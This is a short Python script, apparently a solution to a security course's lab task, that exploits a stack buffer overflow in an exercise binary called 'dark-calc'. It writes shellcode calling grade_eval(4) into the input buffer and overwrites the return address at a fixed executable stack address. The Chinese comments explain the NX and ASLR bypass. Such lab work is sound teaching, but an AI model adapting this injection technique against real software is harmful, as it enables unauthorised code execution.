#!/usr/bin/env python3
"""任务5：栈空间执行 —— 在栈上写机器码，调用 dark-calc 的 grade_eval(4)。

dark-calc 用 init_fixed_stack 通过 mmap 在固定地址 0x721000000000 建了一块
RWX 的"固定栈"，__wrap_main 把 rsp 换成 0x721000801000 再调用 main。因此
input 的 expression 缓冲区落在一个确定且可执行的地址：0x721000800fd0
（NX 和 ASLR 都被这块固定栈"绕过"了）。

我们把一小段 shellcode 放在缓冲区开头，再用溢出把返回地址覆盖成缓冲区地址，
ret 之后 CPU 就执行我们的 shellcode：
    mov edi, 4            ; 第一个参数 = 4
    mov eax, 0x401a87    ; grade_eval 地址
    call rax             ; grade_eval(4) → 打印 "Hope A will be your grade!"
（用 call 而非 push/ret 是为了让 grade_eval 入口时 rsp ≡ 8 (mod 16)，
 这样它内部调用 printf 时栈是 16 字节对齐的，不会在 printf 里崩溃。）
"""
import sys

BUF_ADDR   = 0x721000800fd0     # &expression（固定栈，确定地址）
RET_OFFSET = 24

shellcode = bytes([
    0xbf, 0x04, 0x00, 0x00, 0x00,        # mov    edi, 4
    0xb8, 0x87, 0x1a, 0x40, 0x00,        # mov    eax, 0x401a87 (grade_eval)
    0xff, 0xd0,                          # call   rax
])

payload  = shellcode
payload += b"A" * (RET_OFFSET - len(shellcode))   # 填到返回地址
payload += BUF_ADDR.to_bytes(8, "little")         # 返回地址 = shellcode 所在地址

sys.stdout.buffer.write(payload)
